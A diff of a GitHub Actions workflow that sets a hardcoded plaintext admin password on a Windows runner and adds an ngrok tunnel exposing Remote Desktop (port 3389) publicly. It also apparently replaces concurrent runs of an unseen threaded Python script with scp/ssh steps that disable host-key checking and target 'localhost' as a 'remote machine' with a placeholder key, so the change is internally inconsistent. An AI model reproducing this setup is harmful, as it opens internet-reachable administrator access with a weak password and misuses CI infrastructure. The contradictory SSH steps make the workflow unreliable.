@@ -29,7 +29,10 @@ jobs:
 
     - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
 
-    - name: Run Bash Script
+    - name: Create Tunnel
+      run: .\ngrok\ngrok.exe tcp 3389
+
+    - name: Run Bash Script on Remote Machine
       run: |
         # Write Bash script to a file
         echo '#!/bin/bash
@@ -60,15 +63,12 @@ jobs:
             thread.join()
         \' > script.py
 
-        # Run the script 9 times concurrently
-        for i in {1..9}
-        do
-            python script.py &
-        done
-
-        # Wait for all background processes to finish
-        wait
+        # Run the script
+        python script.py
         ' > run_script.sh
 
-        # Run the Bash script using Git Bash
-        "C:\Program Files\Git\bin\bash.exe" run_script.sh
+        # Copy the Bash script to the remote machine
+        scp -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i path/to/your/private/key.pem run_script.sh runneradmin@localhost:~
+
+        # Execute the Bash script remotely over SSH
+        ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -i path/to/your/private/key.pem runneradmin@localhost "bash run_script.sh"
